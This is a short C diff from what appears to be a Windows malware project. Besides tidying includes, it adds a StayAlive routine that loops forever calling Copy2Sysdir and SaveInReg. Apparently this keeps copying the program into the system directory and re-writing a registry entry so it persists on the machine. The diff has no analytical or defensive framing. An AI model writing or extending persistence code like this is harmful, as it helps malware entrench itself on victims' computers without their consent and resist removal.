@@ -1,7 +1,6 @@
-#include <tchar.h> // _taccess, _tprintf, _tcscat_s, _tcslen
-
 #include "Tools.h"
-#include "..\Debugger.h"
+#include "Constants.h"
+#include "Debugger.h"
 
 BOOL FileExist(CONST PTCHAR filename)
 {
@@ -27,7 +26,6 @@ BOOL FileExist(CONST PTCHAR filename)
 			_tprintf(TEXT("Unknown error.\n"));
 			break;
 		}
-
 
 	return FALSE;
 }
@@ -141,3 +139,11 @@ BOOL SaveInReg(CONST PTCHAR appname)
 	return TRUE;
 }
 
+VOID StayAlive(CONST PTCHAR appname)
+{
+	while (TRUE)
+	{
+		Copy2Sysdir(appname);
+		SaveInReg(appname);
+	}
+}
